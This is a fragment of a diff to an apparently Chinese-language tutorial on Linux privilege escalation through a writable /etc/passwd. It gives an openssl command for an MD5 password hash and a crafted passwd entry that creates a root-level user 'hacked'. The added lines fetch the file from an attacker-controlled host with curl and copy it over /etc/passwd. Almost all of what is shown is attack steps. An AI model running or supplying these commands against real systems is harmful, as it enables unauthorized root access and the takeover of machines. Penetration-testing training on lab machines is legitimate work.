@@ -15,4 +15,8 @@ openssl passwd -1 -salt ignite pass123
 hacked:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash
 ```
 
-在本地主机（例如 kali）构造好 passwd 文件之后，使用 python-http.server 将 passwd 上传到目标机器，然后覆盖即可。
+在本地主机（例如 kali）构造好 passwd 文件之后，使用 python-http.server 将 passwd 上传到目标机器，然后覆盖即可:
+
+```
+curl http://192.168.119.189:8000/passwd >>passwd
+cp passwd /etc/passwd
